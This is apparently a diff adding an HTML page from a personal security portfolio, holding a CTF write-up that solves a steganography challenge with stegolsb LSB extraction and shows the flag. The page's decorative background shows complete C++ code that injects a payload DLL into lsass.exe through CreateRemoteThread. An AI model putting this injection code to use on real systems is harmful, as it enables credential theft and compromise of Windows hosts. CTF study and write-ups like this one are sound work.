@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hidden Layers</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Hidden Layers" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Hidden Layers</h1>
+            
+            <p class="post-meta">Published: April 29, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">HQX{24c0ce09e0e044fa1f45a1439d1d48f0}</code></p>
+
+<h2 id="approach-step-by-step">Approach (Step by Step)</h2>
+
+<ol>
+  <li>After extracting the zip file I got a <code class="language-plaintext highlighter-rouge">.png</code> file. I knew it was a steganography challenge, and even after reading the description it confirmed it was a steganography challenge.</li>
+  <li>Hence I proceeded with <code class="language-plaintext highlighter-rouge">strings</code>, <code class="language-plaintext highlighter-rouge">exiftool</code>, and various commands, but the line <em>‘just you, the pixels and a whisper of something more.’</em> gave a hint about LSB. I had two methods to use: using <code class="language-plaintext highlighter-rouge">stegolsb</code> or an online <code class="language-plaintext highlighter-rouge">stegolsb</code> decoder. I used both and got the same result from both.</li>
+</ol>
+
+<h3 id="online-decoder">Online Decoder:</h3>
+
+<p><img src="/assets/images/writeups/tcs-hackquest/01-hidden-layers-decoder.png" alt="Online LSB Decoder" /></p>
+
+<h3 id="stegolsb-tool">Stegolsb Tool:</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>himanshu@Kaaammui<span class="o">)</span>-[~/Desktop/tcs/layers]-<span class="o">(</span>13-12-2025 10:41:23<span class="o">)</span>
+└─<span class="nv">$ </span>/home/himanshu/ctf/bin/python ~/.local/bin/stegolsb extract image_4F8aD5D762.png
+10:41:50 <span class="o">[</span>INFO] Hidden data:
+
+HQX<span class="o">{</span>24c0ce09e0e044fa1f45a1439d1d48f0<span class="o">}</span>ÿþI<span class="nv">$¶</span>Ûm¶Ûmm¶Ûm¶Ûm¶Ûm¶Ûm¶Û
+m¶Ûmm¶Ûm¶Ûm¶Ûm¶Ûm¶Ûm¶ÛI<span class="nv">$I$I$I$m</span>¶Ûm¶Ûm¶Ûm¶Û¶Ûm¶ÛmI<span class="nv">$I$I$I$$</span>IÛ
+m¶Ûm¶Ûm¶Ûm¶Ûm¶Ûm¶<span class="nv">$I$I$I$I$I$I</span>
+</code></pre></div></div>
+
+<h3 id="flag-with-time">Flag with time:</h3>
+
+<p><img src="/assets/images/writeups/tcs-hackquest/02-hidden-layers-flag.png" alt="Flag with time" /></p>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
